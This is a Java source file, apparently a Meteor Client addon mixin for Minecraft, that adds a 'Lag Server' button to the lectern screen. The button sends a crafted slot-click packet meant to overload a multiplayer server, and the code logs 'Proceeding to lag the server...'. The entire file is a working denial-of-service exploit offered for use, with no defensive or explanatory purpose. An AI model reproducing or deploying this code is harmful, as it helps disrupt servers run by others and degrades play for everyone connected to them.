package com.quackers.plugin.mixin.quackers;

import com.google.common.collect.Lists;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import net.minecraft.client.gui.screen.Screen;
import net.minecraft.client.gui.screen.ingame.LecternScreen;
import net.minecraft.client.gui.widget.ButtonWidget;
import net.minecraft.item.ItemStack;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.slot.Slot;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.text.Text;
import net.minecraft.util.collection.DefaultedList;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;

import java.util.List;

import static meteordevelopment.meteorclient.utils.player.ChatUtils.info;

@Mixin(LecternScreen.class)
public class LecternScreenMixin extends Screen {
    protected LecternScreenMixin(Text title) {
        super(title);
    }

    @Inject(at = @At("TAIL"), method = "init")
    public void init(CallbackInfo ci) {
        this.addDrawableChild(
            new ButtonWidget.Builder(Text.of("Lag Server"), (button) -> {
                ScreenHandler screenHandler = client.player.currentScreenHandler;
                DefaultedList<Slot> defaultedList = screenHandler.slots;
                int i = defaultedList.size();
                List<ItemStack> list = Lists.newArrayListWithCapacity(i);

                for (Slot slot : defaultedList) {
                    list.add(slot.getStack().copy());
                }

                Int2ObjectMap<ItemStack> int2ObjectMap = new Int2ObjectOpenHashMap<>();

                for (int slot = 0; slot < i; ++slot) {
                    ItemStack original = list.get(slot);
                    ItemStack current = defaultedList.get(slot).getStack();
                    if (!ItemStack.areEqual(original, current)) {
                        int2ObjectMap.put(slot, current.copy());
                    }
                }

                ItemStack cursorStack = client.player.currentScreenHandler.getCursorStack();

                client.getNetworkHandler().sendPacket(
                    new ClickSlotC2SPacket(
                        screenHandler.syncId,
                        screenHandler.getRevision(),
                        0,
                        0,
                        SlotActionType.QUICK_MOVE,
                        cursorStack,
                        int2ObjectMap
                    )
                );

                info("Proceeding to lag the server...");
                button.active = false;
            })
                .position(5, 25)
                .size(100, 20)
                .build()
        );
    }
}
